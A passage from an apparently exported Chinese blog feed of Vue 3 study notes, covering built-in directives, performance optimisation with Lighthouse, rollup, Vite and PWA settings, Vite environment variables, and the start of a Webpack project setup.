<h1 id="Vue指令"><a href="#Vue指令" class="headerlink" title="Vue指令"></a>Vue指令</h1><p>“v-“开头的都是vue的（内置）指令，可以直接使用</p>
<ul>
<li><p><code>v-text</code>：显示文本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;!-- 编译成&lt;div&gt;我是一段文字&lt;/div&gt; --&gt;</span><br><span class="line">  &lt;div v-text=&quot;a&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup&gt;</span><br><span class="line">const a = &quot;我是一段文字&quot;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>v-html</code>：展示富文本，但不支持组件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;!-- 编译成&lt;div&gt;&lt;section style=&#x27;color:red;&#x27;&gt;我是一段文字&lt;/section&gt;&lt;/div&gt; --&gt;</span><br><span class="line">  &lt;div v-html=&quot;a&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup&gt;</span><br><span class="line">const a = &quot;&lt;section style=&#x27;color:red;&#x27;&gt;我是一段文字&lt;/section&gt;&quot;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>v-if</code>：控制元素的显示隐藏（切换真假DOM）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;!-- a为真值时才是DOM节点，否则会变成注释节点 --&gt;</span><br><span class="line">  &lt;!-- 当应用在组件上时，v-if和v-show会有区别 --&gt;</span><br><span class="line">  &lt;div v-if=&quot;a&quot;&gt;true&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup&gt;</span><br><span class="line">const a = true</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>v-else-if</code>：<code>v-if</code>的“else if块”，可以链式调用</p>
</li>
<li><p>v-else：v-if条件收尾语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;!-- 编译成&lt;div&gt;C&lt;/div&gt; --&gt;</span><br><span class="line">  &lt;div v-if=&quot;a == &#x27;A&#x27;&quot;&gt;A&lt;/div&gt;</span><br><span class="line">  &lt;div v-else-if=&quot;a == &#x27;B&#x27;&quot;&gt;B&lt;/div&gt;</span><br><span class="line">  &lt;div v-else&gt;C&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup&gt;</span><br><span class="line">const a = &quot;C&quot;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>v-show</code>：控制元素的显示隐藏（css display none和block切换）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;!-- a为真值时display为block，否则为none --&gt;</span><br><span class="line">  &lt;!-- 因此v-show比v-if性能更高，因为它只是切换一下css --&gt;</span><br><span class="line">  &lt;div v-show=&quot;a&quot;&gt;true&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup&gt;</span><br><span class="line">const a = true</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>v-on</code>：简写为@，给元素添加事件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;!-- 这两种写法是等价的 --&gt;</span><br><span class="line">  &lt;button v-on:click=&quot;a&quot;&gt;click me&lt;/button&gt;</span><br><span class="line">  &lt;button @click=&quot;a&quot;&gt;click me&lt;/button&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- 支持动态事件名 --&gt;</span><br><span class="line">  &lt;button @[event]=&quot;a&quot;&gt;click me&lt;/button&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- 支持修饰符 --&gt;</span><br><span class="line">  &lt;div @click=&quot;parent&quot;&gt;</span><br><span class="line">    &lt;!-- 阻止冒泡 --&gt;</span><br><span class="line">    &lt;button @[event].stop=&quot;a&quot;&gt;click me&lt;/button&gt;</span><br><span class="line">    &lt;!-- 开启事件捕获 --&gt;</span><br><span class="line">    &lt;button @[event].capture=&quot;a&quot;&gt;click me&lt;/button&gt;</span><br><span class="line">    &lt;!-- 阻止默认事件 --&gt;</span><br><span class="line">    &lt;button @[event].prevent=&quot;a&quot;&gt;click me&lt;/button&gt;</span><br><span class="line">    &lt;!-- 只能发生一次 --&gt;</span><br><span class="line">    &lt;button @[event].once=&quot;a&quot;&gt;click me&lt;/button&gt;</span><br><span class="line">    &lt;!-- 当event.target为元素本身时才触发 --&gt;</span><br><span class="line">    &lt;button @[event].self=&quot;a&quot;&gt;click me&lt;/button&gt;</span><br><span class="line">    &lt;!-- 永不阻止默认事件 --&gt;</span><br><span class="line">    &lt;button @scroll.self=&quot;b&quot;&gt;scroll me&lt;/button&gt;</span><br><span class="line">    &lt;!-- 可以链式调用，需要注意顺序 --&gt;</span><br><span class="line">    &lt;button @[event].prevent.self=&quot;a&quot;&gt;click me&lt;/button&gt;</span><br><span class="line">    &lt;button @[event].self.prevent=&quot;a&quot;&gt;click me&lt;/button&gt;</span><br><span class="line">    &lt;!-- 还有很多别的修饰符，https://cn.vuejs.org/guide/essentials/event-handling.html#event-modifiers --&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup&gt;</span><br><span class="line">const a = ()=&gt; &#123;</span><br><span class="line">  console.log(&quot;click&quot;)</span><br><span class="line">&#125;</span><br><span class="line">const b = ()=&gt; &#123;</span><br><span class="line">  console.log(&quot;scroll&quot;)</span><br><span class="line">&#125;</span><br><span class="line">const event = &quot;click&quot;</span><br><span class="line">const parent = ()=&gt; &#123;</span><br><span class="line">  console.log(&quot;click parent&quot;)</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>v-bind</code>：简写为:，绑定元素的属性</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;!-- 这两种写法是等价的 --&gt;</span><br><span class="line">  &lt;div v-bind:id=&quot;a&quot;&gt;演示v-bind:id&lt;/div&gt;</span><br><span class="line">  &lt;div :id=&quot;a&quot;&gt;演示:id&lt;/div&gt;</span><br><span class="line">  &lt;!-- 这两种写法是等价的 --&gt;</span><br><span class="line">  &lt;div :style=&quot;style&quot;&gt;演示:style&lt;/div&gt;</span><br><span class="line">  &lt;div :class=&quot;[&#x27;a&#x27;,&#x27;b&#x27;]&quot;&gt;演示:style&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- 可以使用表达式 --&gt;</span><br><span class="line">  &lt;div :class=&quot;[b? &#x27;a&#x27;: &#x27;b&#x27;]&quot;&gt;演示:style&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- 可以同时支持一个动态、一个静态 --&gt;</span><br><span class="line">  &lt;!-- 不能支持多个动态或多个静态 --&gt;</span><br><span class="line">  &lt;div :class=&quot;[b? &#x27;a&#x27;: &#x27;b&#x27;]&quot; class=&quot;c&quot;&gt;演示:style&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup&gt;</span><br><span class="line">const a = 114514</span><br><span class="line">const b = true</span><br><span class="line">const style = &#123;</span><br><span class="line">  color:&quot;red&quot;;</span><br><span class="line">  border:&quot;1px solid black&quot;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">  .a &#123;</span><br><span class="line">    color: red;</span><br><span class="line">  &#125;</span><br><span class="line">  .b &#123;</span><br><span class="line">    border: 1px solid black;</span><br><span class="line">  &#125;</span><br><span class="line">  .c &#123;</span><br><span class="line">    background-color: pink;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>v-model</code>：双向绑定表单元素</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;input v-model=&quot;name&quot; type=&quot;text&quot; /&gt;</span><br><span class="line">    &lt;div&gt;&#123;&#123; name &#125;&#125;&lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup&gt;</span><br><span class="line">// 使用ref或reactive包裹的变量才具有响应式</span><br><span class="line">import &#123; ref &#125; from &quot;vue&quot;</span><br><span class="line">    </span><br><span class="line">const name = ref(&quot;野兽先辈&quot;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>v-for</code>：遍历元素</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;!-- item：数组元素 index：元素下标 --&gt;</span><br><span class="line">    &lt;!-- v-for可以嵌套 --&gt;</span><br><span class="line">    &lt;!-- 需要给v-for提供一个key（唯一值） --&gt;</span><br><span class="line">    &lt;div :key=&quot;index&quot; v-for=&quot;(item, index) in name&quot;&gt;&#123;&#123; index &#125;&#125; - &#123;&#123; item &#125;&#125;&lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup&gt;</span><br><span class="line">const name = [&quot;野兽先辈&quot;, &quot;MUR&quot;, &quot;KMR&quot;, &quot;远野&quot;, &quot;野兽妹&quot;]</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>v-once</code>：性能优化，只渲染一次</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;!-- 改变a的值也不会发生变化 --&gt;</span><br><span class="line">  &lt;div v-once&gt;&#123;&#123; a &#125;&#125;&lt;/div&gt;</span><br><span class="line">  &lt;button @click=&quot;a++&quot;&gt;+&lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup&gt;</span><br><span class="line">import &#123; ref &#125; from &quot;vue&quot;</span><br><span class="line">    </span><br><span class="line">const a = ref(1)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>v-memo</code>：大型项目性能优化</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;!-- 写一个空数组时，效果就和v-once一样 --&gt;</span><br><span class="line">  &lt;div v-memo=&quot;[]&quot;&gt;&#123;&#123; a &#125;&#125;&lt;/div&gt;</span><br><span class="line">  &lt;button @click=&quot;a++&quot;&gt;+&lt;/button&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- 常配合v-for使用，条件成立时才会更新，节省小部分性能 --&gt;</span><br><span class="line">  &lt;div @click=&quot;select(item.id)&quot; :key=&quot;item.id&quot; v-for=&quot;(item) in arr&quot; v-memo=&quot;[item.id === active]&quot;&gt;</span><br><span class="line">      &#123;&#123; item.id &#125;&#125; - selected： &#123;&#123; item.id == active &#125;&#125;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup&gt;</span><br><span class="line">import &#123; ref &#125; from &quot;vue&quot;</span><br><span class="line">    </span><br><span class="line">const a = ref(1)</span><br><span class="line"></span><br><span class="line">import &#123; ref, reactive &#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">const arr = reactive&lt;any[]&gt;([])</span><br><span class="line">for (let i = 0; i &lt; 10000; i++) &#123;</span><br><span class="line">  arr.push(&#123;</span><br><span class="line">    id: i + 1,</span><br><span class="line">    name: &quot;test&quot;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const active = ref(1)</span><br><span class="line"></span><br><span class="line">const select = async (index: number) =&gt; &#123;</span><br><span class="line">  active.value = index;</span><br><span class="line">  console.time()</span><br><span class="line">  await Promise.resolve()</span><br><span class="line">  console.timeEnd()</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue3性能优化</title>
    <url>/web/study/Vue/42.Vue3%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="LightHouse"><a href="#LightHouse" class="headerlink" title="LightHouse"></a>LightHouse</h1><p>浏览器的调试工具中自带LightHouse性能分析。</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306061458016.png"></p>
<p>点击“分析页面负载”生成分析报告。</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306061503119.png"></p>
<p>指标：</p>
<ul>
<li>FCP(First Contentful Paint)：首次内容绘制的时间，浏览器第一次绘制DOM相关的内容，也是用户第一次看到页面内容的时间。</li>
<li>Speed Index：页面各个可见部分的显示平均时间，当页面上存在轮播图或者需要从后端获取内容加载时，这个数据会被影响到。</li>
<li>LCP(Largest Contentful Paint)：最大内容绘制时间，页面最大的元素绘制完成的时间。</li>
<li>TTI(Time to Interactive)：从页面开始渲染到用户可以与页面进行交互的时间，内容必须渲染完毕，交互元素绑定的事件已经注册完成。</li>
<li>TBT(Total Blocking Time)：记录了首次内容绘制到用户可交互之间的时间，这段时间内，主进程被阻塞，会阻碍用户的交互，页面点击无反应。</li>
<li>CLS(Cumulative Layout Shift)：计算布局偏移值得分，会比较两次渲染帧的内容偏移情况，可能导致用户想点击A按钮，但下一帧中，A按钮被挤到旁边，导致用户实际点击了B按钮。</li>
</ul>
<h1 id="rollup"><a href="#rollup" class="headerlink" title="rollup"></a>rollup</h1><p>vite打包基于rollup，安装rollup插件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pnpm add rollup-plugin-visualizer</span><br></pre></td></tr></table></figure>

<p>在vite.config.ts中配置插件：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; defineConfig &#125; <span class="keyword">from</span> <span class="string">&#x27;vite&#x27;</span></span><br><span class="line"><span class="keyword">import</span> vue <span class="keyword">from</span> <span class="string">&#x27;@vitejs/plugin-vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; visualizer &#125; <span class="keyword">from</span> <span class="string">&quot;rollup-plugin-visualizer&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// https://vitejs.dev/config/</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineConfig</span>(&#123;</span><br><span class="line">  <span class="attr">plugins</span>: [<span class="title function_">vue</span>(),<span class="title function_">visualizer</span>(&#123;</span><br><span class="line">    <span class="attr">open</span>: <span class="literal">true</span></span><br><span class="line">  &#125;)],</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>打包后就会呈现这样一个页面：</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306061641069.png"></p>
<p>此处AntDesign太大了，所以可以使用按需引入优化。</p>
<h1 id="Vite配置优化"><a href="#Vite配置优化" class="headerlink" title="Vite配置优化"></a>Vite配置优化</h1><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="attr">build</span>:&#123;</span><br><span class="line">  <span class="attr">chunkSizeWarningLimit</span>:<span class="number">2000</span>,</span><br><span class="line">  <span class="attr">cssCodeSplit</span>:<span class="literal">true</span>, <span class="comment">//css 拆分</span></span><br><span class="line">  <span class="attr">sourcemap</span>:<span class="literal">false</span>, <span class="comment">//不生成sourcemap</span></span><br><span class="line">  <span class="attr">minify</span>:<span class="literal">false</span>, <span class="comment">//是否禁用最小化混淆，esbuild打包速度最快，terser打包体积最小。</span></span><br><span class="line">  <span class="attr">assetsInlineLimit</span>:<span class="number">5000</span> <span class="comment">//小于该值，图片将打包成Base64 </span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>

<h1 id="PWA离线缓存技术"><a href="#PWA离线缓存技术" class="headerlink" title="PWA离线缓存技术"></a>PWA离线缓存技术</h1><p>安装依赖：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install vite-plugin-pwa -D</span><br></pre></td></tr></table></figure>

<p>部分配置项：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">VitePWA</span>(&#123;</span><br><span class="line">  <span class="attr">workbox</span>:&#123;</span><br><span class="line">    <span class="attr">cacheId</span>:<span class="string">&quot;XIaoman&quot;</span>,<span class="comment">//缓存名称</span></span><br><span class="line">    <span class="attr">runtimeCaching</span>:[</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">urlPattern</span>:<span class="regexp">/.*\.js.*/</span>, <span class="comment">//缓存文件</span></span><br><span class="line">        <span class="attr">handler</span>:<span class="string">&quot;StaleWhileRevalidate&quot;</span>, <span class="comment">//重新验证时失效</span></span><br><span class="line">        <span class="attr">options</span>:&#123;</span><br><span class="line">          <span class="attr">cacheName</span>:<span class="string">&quot;114514.js&quot;</span>, <span class="comment">//缓存js，名称</span></span><br><span class="line">          <span class="attr">expiration</span>:&#123;</span><br><span class="line">            <span class="attr">maxEntries</span>:<span class="number">30</span>, <span class="comment">//缓存文件数量，LRU算法</span></span><br><span class="line">            <span class="attr">maxAgeSeconds</span>:<span class="number">30</span> * <span class="number">24</span> * <span class="number">60</span> * <span class="number">60</span> <span class="comment">//缓存有效期</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>PWA能让web网页无限接近于Native应用：</p>
<ul>
<li>可以添加到主屏幕，利用manifest实现</li>
<li>可以实现离线缓存，利用service worker实现</li>
<li>可以发送通知，利用service worker实现</li>
</ul>
<p>打包后会生成sw.js。</p>
<h1 id="其他性能优化"><a href="#其他性能优化" class="headerlink" title="其他性能优化"></a>其他性能优化</h1><ul>
<li>图片懒加载</li>
<li>虚拟列表</li>
<li>webWorker多线程</li>
<li>防抖节流</li>
</ul>
]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
      </tags>
  </entry>
  <entry>
    <title>环境变量</title>
    <url>/web/study/Vue/40.%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h1><p>让开发者区分不同的运行环境，实现兼容开发和生产。</p>
<p>例如<code>npm run dev</code>是开发环境、<code>npm run build</code>是生产环境。</p>
<p>Vite在一个特殊的<code>import.meta.env</code>对象上暴露环境变量，可以在各.vue文件中读取。</p>
<p>而在vite.config.ts中需要通过<code>process.env</code>读取，它会打印电脑上所有的环境变量。</p>
<p>一些在所有情况下都可以使用的内联变量：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;BASE_URL&quot;</span><span class="punctuation">:</span><span class="string">&quot;/&quot;</span><span class="punctuation">,</span> <span class="comment">//部署时的URL前缀</span></span><br><span class="line">  <span class="attr">&quot;MODE&quot;</span><span class="punctuation">:</span><span class="string">&quot;development&quot;</span><span class="punctuation">,</span> <span class="comment">//运行模式</span></span><br><span class="line">  <span class="attr">&quot;DEV&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span>  <span class="comment">//是否在dev环境</span></span><br><span class="line">  <span class="attr">&quot;PROD&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> <span class="comment">//是否是build 环境</span></span><br><span class="line">  <span class="attr">&quot;SSR&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span> <span class="comment">//是否是SSR 服务端渲染模式</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>不能对环境变量使用动态赋值<code>import.meta.env[key]</code>，因为这些环境变量在生产环境打包时会被使用<code>JSON.stringify</code>硬编码注入浏览器。</p>
<h1 id="自定义环境变量"><a href="#自定义环境变量" class="headerlink" title="自定义环境变量"></a>自定义环境变量</h1><p>在项目根目录新建.env.development（开发环境）或.env.production（生产环境）文件，并写入变量，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">VITE_HTTP = http://www.baidu.com</span><br></pre></td></tr></table></figure>

<p>不需要配置，默认会在不同的环境中读取对应的文件。</p>
<p>vite.config.ts中默认无法读取自定义环境变量，需要引入Vite的loadEnv包，并更改文件：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; fileURLToPath, <span class="variable constant_">URL</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;node:url&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; defineConfig, loadEnv &#125; <span class="keyword">from</span> <span class="string">&#x27;vite&#x27;</span></span><br><span class="line"><span class="keyword">import</span> vue <span class="keyword">from</span> <span class="string">&#x27;@vitejs/plugin-vue&#x27;</span></span><br><span class="line"><span class="comment">// import vueJsx from &#x27;@vitejs/plugin-vue-jsx&#x27;</span></span><br><span class="line"><span class="keyword">import</span> tsx <span class="keyword">from</span> <span class="string">&quot;./plugin/index&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">AutoImport</span> <span class="keyword">from</span> <span class="string">&#x27;unplugin-auto-import/vite&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Components</span> <span class="keyword">from</span> <span class="string">&#x27;unplugin-vue-components/vite&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">ElementPlusResolver</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;unplugin-vue-components/resolvers&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// https://vitejs.dev/config/</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> (&#123;mode&#125;:<span class="built_in">any</span>) =&gt; &#123;</span><br><span class="line">  <span class="comment">// mode：当前运行的模式</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(mode)</span><br><span class="line">  <span class="comment">// process.cwd()：获取vite根目录</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">loadEnv</span>(mode,process.<span class="title function_">cwd</span>()))</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">defineConfig</span>(&#123;</span><br><span class="line">    <span class="attr">plugins</span>: [</span><br><span class="line">      <span class="title function_">vue</span>(),</span><br><span class="line">      <span class="comment">// vueJsx(),</span></span><br><span class="line">      <span class="title function_">tsx</span>(),</span><br><span class="line">      <span class="title class_">AutoImport</span>(&#123;</span><br><span class="line">        <span class="attr">resolvers</span>: [<span class="title class_">ElementPlusResolver</span>()],</span><br><span class="line">        <span class="attr">imports</span>: [<span class="string">&quot;vue&quot;</span>],</span><br><span class="line">        <span class="attr">dts</span>: <span class="string">&quot;src/auto-import.d.ts&quot;</span></span><br><span class="line">      &#125;),</span><br><span class="line">      <span class="title class_">Components</span>(&#123;</span><br><span class="line">        <span class="attr">resolvers</span>: [<span class="title class_">ElementPlusResolver</span>()],</span><br><span class="line">      &#125;)</span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">resolve</span>: &#123;</span><br><span class="line">      <span class="attr">alias</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;@&#x27;</span>: <span class="title function_">fileURLToPath</span>(<span class="keyword">new</span> <span class="title function_">URL</span>(<span class="string">&#x27;./src&#x27;</span>, <span class="keyword">import</span>.<span class="property">meta</span>.<span class="property">url</span>))</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">css</span>: &#123;</span><br><span class="line">      <span class="attr">preprocessorOptions</span>: &#123;</span><br><span class="line">        <span class="attr">scss</span>: &#123;</span><br><span class="line">          <span class="attr">additionalData</span>: <span class="string">`@import &quot;@/bem.scss&quot;;`</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
        <tag>Vite</tag>
      </tags>
  </entry>
  <entry>
    <title>Webpack构建Vue3项目</title>
    <url>/web/study/Vue/41.Webpack%E6%9E%84%E5%BB%BAVue3%E9%A1%B9%E7%9B%AE.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<p>目录：</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306052201791.png"></p>
<p>package.json：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;webpack-demo&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;main&quot;</span><span class="punctuation">:</span> <span class="string">&quot;index.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;test&quot;</span><span class="punctuation">:</span> <span class="string">&quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;dev&quot;</span><span class="punctuation">:</span> <span class="string">&quot;webpack-dev-server&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;build&quot;</span><span class="punctuation">:</span> <span class="string">&quot;webpack&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;keywords&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;author&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;license&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ISC&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;dependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@vue/compiler-sfc&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^3.3.4&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;clean-webpack-plugin&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^4.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;css-loader&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^6.8.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;dart-sass&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^1.25.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;friendly-errors-webpack-plugin&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^1.7.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;html-webpack-plugin&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^5.5.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;sass&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^1.62.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;sass-loader&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^13.3.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;scss-loader&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^0.0.1&quot;</span><span 